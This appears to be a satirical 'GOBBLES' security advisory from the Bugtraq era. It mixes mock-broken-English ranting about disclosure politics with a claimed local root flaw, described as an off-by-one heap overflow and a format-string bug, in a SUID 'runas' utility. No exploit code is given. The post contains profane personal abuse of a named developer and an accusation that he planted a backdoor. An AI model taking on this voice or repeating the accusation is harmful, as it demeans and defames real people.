I pass by the sins, left by a different man
The tides brought them here, cast by a different hand

-- The Tea Party "The River"

I believe in something else 
Now go bother someone else
Stick your fingers in your book
Take a better second look, you crook
I hate it when you breach my space
And I hate it when you preach your case
And you should go down, down
Save someone else

Hehe, very nice UNICOS hole on bugtraq. Great to see more soldier of full
disclosure out there hehehe.

cousin WOBBLES == bindview

Bindview == Microsoft partner

HellNBak criticize Microsoft... hmmmm? logic?

GOBBLES know few lawyer friends in USA and Canada willing to do pro bono job
if copyright infringement occurs.

THIS VULNERABILITY HANDS OVER LOCAL ROOT. NO EXCUSES NOW.

If this post not get through to bugtraq, we will consider securityfocus
being mean to us and discriminating us based on our literary abilities! We
provide legitimate security research that public need to know! We
disheartened when we not afforded the equality of other researcher who post
revolutionary new vulnerabilities. Only difference between they and GOBBLES
is that they get to get award at www.grammarbook.com and we don't. No reason
why our critical research has to be delayed to the public. Mr Ahmad, don't
be a bully :~(

You can find all of our moderated advisories in the complete collection:

http://www.bugtraq.org/advisories.html

One of these moderated advisories was a VERY serious security problem in the
implementation of OpenSSH's sftp. According to book _Practical UNIX &
Internet Security_, lack of a logging capability can violate your corporate
security policy's ACCOUNTABILITY clauses. We don't know why this was
moderated by securityfocus when similar hole in different product get let
through :\

Maybe if we beg for warez like Alfred Huger our posts will get through?

..............................jmpl %i7+8,%g0...............................

GOBBLES has he own way of preventing defacements. He use he heart. Right
now, GOBBLES want to say he group DMZ website is vulnerable to sneaky
blackhat warez like securityfocus subnet. GOBBLES beg blackhat not to deface
he page with sophisticated exploits that don't be disclosed, because GOBBLES
is poor guy in third world country trying to make ends meet.

GOBBLES realize that CERT can't protect him from blackhat warez. GOBBLES
realize that securityfocus can't protect him from blackhat warez. GOBBLES
realize that only way to stop he website getting attacked with blackhat
warez is to beg blackhats not to attack him. Please, friend, GOBBLES can't
patch and be secure from full disclosure if someone use exploit that
securityfocus don't know exist! Please, friend, if you must attack us please
do NOT back up our data like cute ethical hacker otherwise we will have to
make fun of you for being such a pansy pussy heeheheheeeeeee j/k.

                            SEGFAULT IRCS
***************************************************************************

There are many fake GOBBLES going around with permutations, transmutations,
and transpositions of GOBBLES name. One server, segfault ircs, have many
fake GOBBLES coming on insulting people who GOBBLES researchers like. Please
be aware GOBBLES researchers idle on this server but never use GOBBLES name
or claim, directly or indirectly, to be GOBBLES TEAM BUGTRAQ COMMERCIAL
PENETRATOR RESEARCH COMMUNITY INFORMATION ANARCHIST. Hehe, yes we support
HellNBak@nmrc.org call for arms on Information Anarchy and glad to see they
get off to a great start with recent bugtraq post about some session-id
thing in that product thing.

Sure we like being around our geek friends hehehe but real reason is that
maybe one day some women join this server. If they German or Swedish chicks
hehehe GOBBLES will have to unleash his charisma and magnetism hehehe and do
like /msg [chick] printf("hello, world!\n"); heheheheheheheheheeee don't use
my pickup line hehehehehe. But first we would need to ASCII bomb LCAMTUF and
LORIAN so they don't steal all our potential women >:o/

We would like to greet the SNOW and TSK alliance stunnel remote exploit,
aptly called SNoTS.c. It allow us to steal apache-scalp.c multi-platform
remote Apache 1.3.x exploit from DIANORA AKA EVIL ANGELICA'S MOM. Very nice!
It is a very subtle and intricate bug, and the way you've forced that buffer
underflow condition allowing you to overwrite an activation record by taking
advantage of a poorly applied integer coercion, is just truly amazing,
ma'am. Oh wait, that's hybrid-6 heheheheee! Anyway, security community must
be furious that you have this Apache remote exploit lingering around
hehehehe. Be sure to copyright it so the penetrators don't leech it hehehe.

GOBBLES LABS will be writing own Apache remote and will release press
announcement in a month or so about arranging for $100,000 USD
non-refundable payment for exploit. Hehehehe, don't worry, we just speaking
through our asses heeheheheheeee hehe. . . hehe .. . he...

We do not in any way reveal our identities because we don't want to be
begged for our gzip warez and our private version of nsmail exploit. We
understand that penetrators are sometimes too busy to write their own
exploits, but GOBBLES believe that it is important to use other keys on
keyboard besides dot and slash, otherwise there is ergonomic risk with RSI
(repetitive strain injury). Same goes for SANS professionals at sans.org and
their $50,000 ethereal dump analyses: important to do regular mobility
exercises and not strain yourselves with too much point-and-clicking. We are
keeping an eye on you too, Dave Dittrich!!! Bend from the knees.

We have loyal fans who not let people make fun of GOBBLES like TOMAS (hehe
he really cool, we send him letter asking for wu 2.6.1 exploit so we can
test our network and add signature to GOBBLES IDS [doesn't matter if it only
detect one exploit, who carez hehe] and make a quick buck by busting a hole
with an authorized penetration test -- no reply yet hehe, but GLOBBLES still
love you tomas :X ), BOBCAT (hehe he our official cheerleader hehe),
DRSTNGLOV (mr undercover hehe he really nice and elite too), ROUTE (hehe he
the caricature on front cover of phrack 57 official edition hehehee), SNOW
(hehe), and MADJESTER ().

SECURITY HISTORY
****************

Nothing.

BACKGROUND
**********

Runas is SUID root program. GOBBLES don't know what is funnier: people
writing ethics articles and continuing "hacker vs. cracker" debate and
raising notion of hacker to biblical airy fairy level; or, the irony of a
security product containing security holes. A security product such as
runas. So that it can receive due humiliation, we will recant that the name
of this product is....

Hehehehe, at least he read .pdf files written by stuffed-shirt geezers with
four inch thick glasses! Heheheh GOBBLES likes USENIX and ACM papers more
though! Being able to link to those in references make GOBBLES team look
ultra scholarly! But no ability to cite passages from bloated drivel will
protect chris@metagame.org from the shame he should be feeling right now as
he reads this.

Chrissy whissy, congratu-fucking-lations -- your immaturity and lack of
netiquette has just been exposed with revelation of your backdoored security
utility. Like the CORE SDI crc32 backdoor we discussed in our sftp advisory,
your lack of regard for humanity will cultivate nothing but dejection and
scorn, you clueless fucking salad tosser.

Hehe, can you spot off-by-one heap-based overflow?!?! Similar function as
sudo vuln function hehehe. Identical class of product too hehehe. Maybe
Illuminati behind this conspiracy lololololololololololololololololol.

But easy to see fmtstringerizer hole there with syslog().

COMING SOON: GOBBLES LINUX
**************************

An announcement to bugtraq will be made with the release of GOBBLES LINUX.
It will borrow from Trinux source tree and GOBBLES going to add following
security measures...

1.  no inetd or standalone daemons... 
2.  no SUID or SGID programs... 
3.  latest kernel and libraries with each release...
4.  heavy firewalling...

Unlike OpenBSD project, GOBBLES LINUX will never have had a remote root hole
in the default install. Hehehe we know Theodore will be concerned we've
plagiarized his command line hardening techniques, but rest assured Theo
will be given full credit for sed 's/^/#/' inetd.conf stuff.
